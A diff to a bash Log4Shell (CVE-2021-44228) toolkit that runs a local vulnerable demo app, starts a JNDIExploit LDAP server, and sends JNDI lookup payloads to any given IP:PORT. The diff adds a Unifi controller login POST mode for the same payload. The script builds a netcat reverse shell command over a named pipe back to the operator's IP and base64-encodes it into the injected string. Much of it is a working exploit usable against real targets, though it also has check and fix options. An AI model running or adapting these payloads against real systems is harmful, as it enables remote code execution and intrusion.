@@ -5,9 +5,10 @@
 # Software list: https://github.com/cisagov/log4j-affected-db
 #
 # PoC _ https://github.com/christophetd/log4shell-vulnerable-app
+#     _	https://github.com/kozmer/log4j-shell-poc
 #
 # log4j2.noFormatMsgLookup = true
-# JVM -> Log4j update : 2.15 -> 2.16
+# JVM -> Log4j update : 2.15 -> 2.16 -> 2.17 (atm fixed)
 #
 # $0 [options] [command] [exploit-ip-server]
 
@@ -25,6 +26,7 @@
 
 MY_IP=$(ip addr | grep "inet .*scope global" | sed -r 's/.*\ ([0-9].*)\/.*/\1/g' | head -n1)
 XPL_IP=$MY_IP
+X_MODE="X-API REST"
 
 _url_encoder() {
 
@@ -48,9 +50,9 @@ _run_xploit_server() {
 	fi
 	
 	sleep 2
-	echo -e "\nRunning LDAP server on $XPL_IP:8888 -> LDAP:1389\n"
+	echo -e "\nRunning LDAP server on $XPL_IP:4288 -> LDAP:1389\n"
 	# Screen -> Session create Window Ctrl+a C ; Split: Ctrl+a S or | ; Kill k ; Help ?
-	screen -dm -S l4s4s-ldap-srv bash -c 'java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -p 8888'
+	screen -dm -S l4s4s-ldap-srv bash -c 'java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 4288'
 }
 
 _set_windows() {
@@ -114,14 +116,14 @@ _run_dummy_server() {
 
 	echo "Running PoC - Springboot / Tomcat server:"
 	echo
-	echo "watch content with : docker exec vulnerable-app ls /tmp"
-	echo
-	sleep 2
-	screen -dm -S l4s4s-tomcat-srv bash -c 'docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app'
+	echo "Later you can watch success with : docker exec vulnerable-app ls /root"
+	echo && sleep 2
+	docker rm -f vulnerable-app && sleep 2
+	screen -dm -S l4s4s-tomcat-srv bash -c 'docker run --name vulnerable-app -p 4280:8080 ghcr.io/christophetd/log4shell-vulnerable-app'
 
 	# BUILD SELF
 	# docker build . -t vulnerable-app
-	# docker run -p 8080:8080 --name vulnerable-app vulnerable-app
+	# docker run -p 4280:8080 --name vulnerable-app vulnerable-app
 
 	# ssh $XPL_IP -p 22 "wget $ARCH_URL && unzip JNDIExploit.v1.2.zip && java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $XPL_IP -p 8888"
 	_run_xploit_server
@@ -136,9 +138,8 @@ _run_attack() {
 	RSH=0
 	
 	if [[ "$2" =~ ^-[a-z] ]]; then
-		VIC_IP_PRT=127.0.0.1:8080
-		C3=$2
-		#shift 1
+		VIC_IP_PRT=127.0.0.1:4280
+		C3=$2 #shift 1
 	else
 		VIC_IP_PRT=$2
 		C3=$3
@@ -146,14 +147,10 @@ _run_attack() {
 		
 	if [[ "$C3" =~ ^-e ]]; then
 		echo "Starting reverse netcat proxy-shell..."
-		# nc -e issnt working in maintain versions :()
-
-		#Listen & run on other term/host
 		#nohup nc -nvlp 4244 &
-		screen -dm -S l4s4s-nc-rsh bash -c 'nc -nvlp 4244'
-		RSH=1
+		screen -dm -S l4s4s-nc-rsh bash -c 'nc -nvlp 4244' && RSH=1
 		
-		# Reverse Prixy Shell - NC version
+		# Reverse Proxy Shell - NC version
 		# rm -f /tmp/bp;mknod /tmp/bp p && cat /tmp/bp | /bin/sh -i 2>&1 | nc $MY_IP 4244 >/tmp/bp
 		C="rm -f /tmp/bp;mknod /tmp/bp p && /bin/sh 0</tmp/bp | nc $MY_IP 4244 1>/tmp/bp"
 	elif [[ "$C3" =~ ^-t ]]; then
@@ -167,8 +164,15 @@ _run_attack() {
 	B64C=$(echo $C | base64 -w0)
 	B64S=$(_url_encoder $B64C)
 
-	echo -e "\nConnection to $VIC_IP_PRT - Using XPL IP: $XPL_IP"
-	curl -sSL $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://'$XPL_IP':1389/Basic/Command/Base64/'$B64S'}'
+	echo -e "\nConnection to $VIC_IP_PRT | Using uB64-HASH: ($B64S) | MODE: $X_MODE"
+	if [ "$X_MODE" == "Unifi-POST" ]; then
+		# Post api -> $VIC_IP_8443/api/login
+		curl -ksSL -X POST $VIC_IP_PRT -H "Content-Type: application/json" \
+		     -d '{"username":"${jndi:ldap://'$XPL_IP':1389/Basic/Command/Base64/'$B64S'}","password":"none","remember":false,"strict":true}'
+	else
+		curl -ksSL $VIC_IP_PRT -H 'X-Api-Version: ${jndi:ldap://'$XPL_IP':1389/Basic/Command/Base64/'$B64S'}'
+	fi
+		
 	
 	echo -e "\nOK. Now you can select your Screen to check:\n"
 	screen -ls
@@ -202,7 +206,6 @@ _get_python_scan() {
 	python3 log4j-scan.py $_COM
 }
 
-
 # MAIN()
 echo -e "         															"                                                                                                                     
 echo -e "_|                            _|  _|              _|                  _|  _|  _|  _|              _|                  _|  _|	"  
@@ -229,8 +232,11 @@ elif [ "$1" == "--run-dummy-server" ]; then
 	_run_dummy_server
 	exit 0
 elif [ "$1" == "--run-attack" ]; then
-	if [ $3 ]; then 
-		_run_attack $1 $2 $3
+	if [ "$4" == "--unifi-post" ]; then
+		X_MODE="Unifi-POST"
+	fi
+	if [ "$3" ]; then 
+		_run_attack $1 $2 "$3"
 	elif [ $2 ]; then
 		_run_attack $1 $2
 	else
@@ -249,7 +255,7 @@ else
 	echo "			--check-system"
 	echo "			--fix-log4j"
 	echo "			--run-dummy-server <JNDIExploit.*.zip>"
-	echo "			--run-attack <FORMAT: IP:PORT> <-e/-t>"
+	echo "			--run-attack <FORMAT: IP:PORT> <-e/-t/'cmd'>"
 	echo "			--python-scan <command>"
 	echo
 	exit 1;
